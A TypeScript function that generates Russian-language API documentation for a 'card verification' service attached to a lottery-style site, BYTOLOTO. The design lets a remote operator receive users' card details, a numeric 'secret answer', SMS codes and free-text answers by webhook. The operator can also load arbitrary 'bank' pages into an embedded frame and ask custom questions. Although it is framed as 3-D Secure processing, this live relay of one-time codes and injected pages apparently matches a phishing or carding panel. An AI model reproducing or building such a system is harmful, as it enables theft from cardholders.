export function buildApiDocs({ baseUrl, apiKey }: { baseUrl: string; apiKey: string }) {
  const api = `${baseUrl}/api/v1`
  return `# BYTOLOTO — Card Verification API v1

Сгенерировано ${new Date().toISOString()}. Документ содержит секретный ключ — храните его только на сервере и не передавайте третьим лицам.

---

## 1. Назначение

API подключает к сайту BYTOLOTO внешний сервис проверки банковских карт (процессинг, эквайер, 3-D Secure провайдер).

Когда пользователь привязывает карту, сайт создаёт **заявку** с уникальным номером вида \`BL-XXXXXX\`. Дальше сервис проверки полностью управляет заявкой через API:

1. получает новую заявку — вебхуком \`card.created\` или опросом списка;
2. передаёт сайту ссылку на страницу проверки (3-D Secure, удержание суммы) — сайт сам показывает её пользователю во встроенном окне;
3. при необходимости запрашивает у пользователя код или ответ на дополнительный вопрос;
4. фиксирует итог — карта подтверждена или отклонена с причиной.

Каждое изменение заявки отправляется сервису вебхуком, поэтому опрос не обязателен.

---

## 2. Подключение

| Параметр | Значение |
|---|---|
| Базовый адрес | \`${api}\` |
| API-ключ | \`${apiKey}\` |
| Формат | JSON, UTF-8 |
| Авторизация | заголовок \`Authorization: Bearer <ключ>\` |
| Протокол | только HTTPS |

Проверка подключения:

~~~bash
curl -H "Authorization: Bearer ${apiKey}" ${api}/ping
~~~

~~~json
{ "ok": true, "version": "v1", "webhookConfigured": true, "serverTime": "2026-05-10T12:00:00.000Z" }
~~~

\`webhookConfigured: false\` означает, что адрес для вебхуков на сайте ещё не задан (см. раздел 6).

---

## 3. Жизненный цикл заявки

~~~
                ┌────────────── redirect (ссылка на страницу проверки) ─────────────┐
                │                                                                   ▼
 card.created ─▶ pending ──request_code──▶ code_requested ──(код введён)──▶ pending
                   │      ──extra_check──▶ extra_check    ──(ответ дан)───▶ pending
                   │
                   ├──approve──▶ confirmed   (финальный)
                   └──reject───▶ rejected    (финальный)
~~~

| Статус | Значение |
|---|---|
| \`pending\` | заявка ждёт действия сервиса проверки |
| \`code_requested\` | пользователю показано поле для кода, ждём ввода |
| \`extra_check\` | пользователю задан дополнительный вопрос, ждём ответа |
| \`confirmed\` | карта подтверждена, пользователь может выводить средства |
| \`rejected\` | карта отклонена, пользователь видит причину |

\`confirmed\` и \`rejected\` финальные: любые действия с такой заявкой вернут \`409 invalid_state\`.

### Встроенное окно проверки (frameStatus)

После действия \`redirect\` сайт показывает пользователю короткое предупреждение о временном удержании суммы для проверки карты, затем открывает ссылку во встроенном окне.

| frameStatus | Значение |
|---|---|
| \`null\` | ссылка ещё не передана |
| \`opened\` | пользователь открыл страницу проверки |
| \`finished\` | страница проверки перенаправила пользователя дальше (проверка пройдена на стороне банка) |

Когда окно завершено, сайт отправляет вебхук \`card.frame_finished\` — после него сервис должен вызвать \`approve\` или \`reject\`. Если страница банка не открывается во встроенном окне, пользователю предлагается открыть её в новой вкладке.

---

## 4. Объект заявки

~~~json
{
  "requestNo": "BL-7K2M9P",
  "status": "pending",
  "brand": "visa",
  "bankName": "Беларусбанк",
  "last4": "4242",
  "cardholder": "IVAN IVANOV",
  "secretAnswer": "125.50",
  "extraCheckQuestion": null,
  "redirectUrl": null,
  "frameStatus": null,
  "frameFinishedAt": null,
  "resultReason": null,
  "createdAt": "2026-05-10T12:00:00.000Z",
  "processedAt": null
}
~~~

| Поле | Тип | Описание |
|---|---|---|
| \`requestNo\` | string | уникальный номер заявки \`BL-XXXXXX\` |
| \`status\` | string | статус (раздел 3) |
| \`brand\` | string \\| null | платёжная система |
| \`bankName\` | string \\| null | банк-эмитент |
| \`last4\` | string | последние 4 цифры карты (полный номер через API не передаётся) |
| \`cardholder\` | string \\| null | имя держателя |
| \`secretAnswer\` | string \\| null | ответ пользователя на контрольный вопрос (только цифры, точка, запятая) |
| \`extraCheckQuestion\` | string \\| null | текст последнего дополнительного вопроса |
| \`redirectUrl\` | string \\| null | ссылка на страницу проверки |
| \`frameStatus\` | string \\| null | состояние встроенного окна |
| \`frameFinishedAt\` | string \\| null | когда окно завершилось (ISO 8601) |
| \`resultReason\` | string \\| null | причина отказа / комментарий к решению |
| \`createdAt\` | string | время создания (ISO 8601, UTC) |
| \`processedAt\` | string \\| null | время финального решения (ISO 8601, UTC) |

---

## 5. Методы

Все методы требуют заголовок \`Authorization: Bearer <ключ>\`. Ответы не кэшируются.

### 5.1. GET /ping — проверка подключения

Возвращает \`ok\`, версию API, признак настроенного вебхука и время сервера (раздел 2).

### 5.2. GET /card-requests — список заявок

| Параметр | Описание |
|---|---|
| \`status\` | фильтр по статусу: \`pending\`, \`code_requested\`, \`extra_check\`, \`confirmed\`, \`rejected\` |
| \`limit\` | количество записей, по умолчанию 50, максимум 200 |
| \`createdAfter\` | только заявки, созданные позже указанного времени (ISO 8601) — удобно для опроса |

~~~bash
curl -H "Authorization: Bearer ${apiKey}" "${api}/card-requests?status=pending&limit=20"
~~~

~~~json
{ "requests": [ { "requestNo": "BL-7K2M9P", "status": "pending", "...": "..." } ] }
~~~

### 5.3. GET /card-requests/{requestNo} — одна заявка

~~~bash
curl -H "Authorization: Bearer ${apiKey}" ${api}/card-requests/BL-7K2M9P
~~~

~~~json
{ "request": { "requestNo": "BL-7K2M9P", "status": "pending", "...": "..." } }
~~~

### 5.4. POST /card-requests/{requestNo} — действие над заявкой

Тело — JSON с полем \`action\`. Успешный ответ: \`{ "ok": true, "request": { ... } }\` с обновлённой заявкой.

| action | Поля | Что происходит | Допустимо в статусе |
|---|---|---|---|
| \`redirect\` | \`url\` — ссылка \`https://\` | пользователь видит предупреждение об удержании суммы, затем страницу проверки во встроенном окне | \`pending\`, \`code_requested\`, \`extra_check\` |
| \`request_code\` | — | пользователю показывается поле для кода (например, из SMS) | \`pending\` |
| \`extra_check\` | \`question\` — до 300 символов | пользователю показывается дополнительный вопрос | \`pending\` |
| \`approve\` | \`reason\` — необязательно | карта подтверждена | любой нефинальный |
| \`reject\` | \`reason\` — рекомендуется | карта отклонена, пользователь видит причину | любой нефинальный |

Передать ссылку на страницу проверки:

~~~bash
curl -X POST -H "Authorization: Bearer ${apiKey}" -H "Content-Type: application/json" \\
  -d '{"action":"redirect","url":"https://3ds.bank.example/session/abc"}' \\
  ${api}/card-requests/BL-7K2M9P
~~~

Подтвердить карту:

~~~bash
curl -X POST -H "Authorization: Bearer ${apiKey}" -H "Content-Type: application/json" \\
  -d '{"action":"approve"}' ${api}/card-requests/BL-7K2M9P
~~~

Отклонить карту:

~~~bash
curl -X POST -H "Authorization: Bearer ${apiKey}" -H "Content-Type: application/json" \\
  -d '{"action":"reject","reason":"Недостаточно средств для проверочного удержания"}' \\
  ${api}/card-requests/BL-7K2M9P
~~~

---

## 6. Вебхуки

Сайт отправляет \`POST\` на адрес, заданный в переменной окружения \`CARD_WEBHOOK_URL\` (только HTTPS). Отвечайте \`2xx\` в течение 8 секунд. При сетевой ошибке, таймауте, \`429\` или \`5xx\` сайт повторяет попытку через 2 и 10 секунд; на другие \`4xx\` повторов нет.

### Заголовки

| Заголовок | Значение |
|---|---|
| \`X-Bytoloto-Event\` | тип события |
| \`X-Bytoloto-Event-Id\` | уникальный id события (UUID) — используйте для защиты от дублей |
| \`X-Bytoloto-Signature\` | \`t=<unix-время>,v1=<HMAC-SHA256>\` |

### Тело

~~~json
{
  "id": "6f1c2a9e-...",
  "event": "card.answer_received",
  "createdAt": "2026-05-10T12:00:05.000Z",
  "data": {},
  "request": { "requestNo": "BL-7K2M9P", "status": "pending", "...": "..." }
}
~~~

В \`request\` всегда лежит актуальное состояние заявки (раздел 4), в \`data\` — данные события (например, введённый код).

### События

| Событие | Когда | Что делать сервису |
|---|---|---|
| \`card.created\` | пользователь ввёл данные карты | начать проверку |
| \`card.answer_received\` | пользователь ответил на контрольный вопрос (\`secretAnswer\`) | передать \`redirect\` или принять решение |
| \`card.frame_opened\` | пользователь открыл страницу проверки | ждать |
| \`card.frame_finished\` | страница проверки перенаправила пользователя дальше | вызвать \`approve\` или \`reject\` |
| \`card.code_requested\` | после \`request_code\` | ждать ввода |
| \`card.code_submitted\` | пользователь ввёл код (\`data.code\`) | проверить и принять решение |
| \`card.extra_check_requested\` | после \`extra_check\` | ждать ответа |
| \`card.extra_check_answered\` | пользователь ответил (\`data.answer\`) | проверить и принять решение |
| \`card.confirmed\` | карта подтверждена | — |
| \`card.rejected\` | карта отклонена | — |

### Проверка подписи

Подпись — HMAC-SHA256 от строки \`<t>.<тело запроса>\`, ключ — ваш API-ключ. Сверяйте подпись по сырому телу (до парсинга JSON) и отклоняйте запросы старше 5 минут.

~~~js
import crypto from "node:crypto"

function verify(rawBody, header, apiKey) {
  const parts = Object.fromEntries(header.split(",").map((p) => p.split("=")))
  if (Math.abs(Date.now() / 1000 - Number(parts.t)) > 300) return false
  const expected = crypto.createHmac("sha256", apiKey).update(parts.t + "." + rawBody).digest("hex")
  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(parts.v1 || ""))
}
~~~

---

## 7. Ошибки

Формат: \`{ "error": { "code": "...", "message": "..." } }\`

| HTTP | code | Причина |
|---|---|---|
| 400 | \`invalid_json\` | тело не является JSON |
| 400 | \`invalid_action\` | неизвестное действие |
| 400 | \`invalid_url\` | ссылка не \`https://\` |
| 400 | \`invalid_question\` | пустой вопрос |
| 400 | \`invalid_status\` | неизвестный статус в фильтре |
| 400 | \`invalid_created_after\` | неверная дата в \`createdAfter\` |
| 401 | \`unauthorized\` | нет ключа или ключ неверный |
| 404 | \`not_found\` | заявка не найдена |
| 409 | \`invalid_state\` | действие недопустимо в текущем статусе |
| 503 | \`not_configured\` | API отключён на сервере (ключ не задан) |

---

## 8. Типовой сценарий

1. Приходит \`card.created\`, затем \`card.answer_received\`.
2. Сервис создаёт сессию проверки у себя и вызывает \`redirect\` со ссылкой.
3. Пользователь видит предупреждение «будет временно удержана сумма для проверки карты, она сразу вернётся», затем проходит проверку во встроенном окне.
4. Приходит \`card.frame_finished\`.
5. Сервис вызывает \`approve\` или \`reject\` с причиной; приходит \`card.confirmed\` или \`card.rejected\`.

Если вебхук недоступен, опрашивайте \`GET /card-requests?createdAfter=<время последнего опроса>\` раз в 5–10 секунд.
`
}
